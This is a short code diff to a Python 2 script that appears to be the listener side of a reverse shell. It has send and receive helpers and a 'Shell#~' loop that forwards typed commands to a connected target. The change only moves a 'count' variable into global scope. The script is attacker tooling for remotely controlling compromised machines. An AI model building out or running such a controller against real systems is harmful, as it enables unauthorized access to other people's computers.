@@ -4,6 +4,8 @@ import socket
 import json
 import base64
 
+count = 1
+
 def reliable_send(data):
     json_data = json.dumps(data)
     target.send(json_data)
@@ -19,6 +21,7 @@ def reliable_recv():
             continue
 
 def shell():
+    global count
     while True:
         command = raw_input("Shell#~%s: "%str(ip))
         reliable_send(command)
@@ -64,7 +67,6 @@ def server():
     print("[+] Connection established From: %s" % str(ip))
 
 
-count = 1
 server()
 shell()
 s.close()
